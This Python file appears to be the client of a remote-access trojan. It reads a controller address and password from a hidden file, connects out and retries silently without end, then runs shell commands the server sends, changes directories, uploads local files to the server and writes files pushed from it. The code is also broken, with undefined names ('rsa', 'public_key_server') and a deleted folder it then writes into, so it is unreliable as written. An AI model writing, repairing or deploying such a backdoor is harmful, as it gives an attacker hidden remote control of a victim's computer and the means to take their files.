import socket,os,subprocess,sys,time
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
file_path_to_read_and_write = os.path.abspath(".data.one")
port = 1025

# Keys and password for authentication and connection
def data_loader():
    arr = []
    file = open(file_path_to_read_and_write,"r")
    for i in file.readlines():
        i = i.replace("\n","")
        if i=="\n":
            pass
        else:
            arr.append(i)
    file.close()
    del file
    return arr[0],arr[1]

try:
    os.rmdir("temp")
except:
    pass
    
host,recv_password = data_loader()
key = RSA.generate(1024)
private_key = key.export_key()
file_out = open("temp/private.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.publickey().export_key()
file_out = open("temp/receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

host,recv_password = data_loader()

# Creates socket
def create_socket():
    s = socket.socket()
    s.connect((host, port))
    security(s)

# Encrypts content and send it
# Send data length and data
def sender(conn,data):
    encrypted_data = rsa.encrypt(data.encode(),public_key_server)
    encrypted_data_len = str(sys.getsizeof(encrypted_data.decode()))
    encrypted_data_len = rsa.encrypt(encrypted_data_len.encode(),public_key_server)
    conn.send(encrypted_data_len)
    time.sleep(0.1)
    conn.send(encrypted_data)

# Receives data and decrypt it
# Receive data length and data
def receiver(conn):
    data_len = conn.recv(10200)
    data_len = int(rsa.decrypt(data_len,private_key).decode())
    data = conn.recv(data_len)
    data = rsa.decrypt(data,private_key).decode()
    del data_len
    return data


# Process data and send the result to the server
# input s
def deptor(s):
    while True:
        data = receiver(s)
        data = data.encode()
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            currentWD = os.getcwd() + "> "
            sender(s,currentWD)
            continue
        elif data.decode() == 'exitu':
            sys.exit(1)
        elif data.decode() == 'filetransferfromu12344':# For file transfer
            path = receiver(s)
            file = open(path,"rb")
            arr = file.read()
            s.send(str(len(arr)).encode())
            time.sleep(0.2)
            s.send(arr)
            file.close()
            del arr,file,path
            continue
        elif data.decode() == 'filetransferfromus12344':# For file transfer
            t_p = receiver(s)
            
            length = s.recv(200000).decode()
            length = int(length)
            ar = s.recv(length)
            fil = open(t_p,"wb")
            fil.write(ar)
            fil.close()
            del fil,ar,t_p
            continue
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            sender(s,output_str + currentWD)
            continue

# Security check for authentication
def security(s):
    sender(s,public_key)
    rec = receiver(s)
    if rec == recv_password:
        deptor(s)
    else:
        s.close()
        del s
        create_socket()


while True:
    try:
        create_socket()
    except Exception as msf:
        pass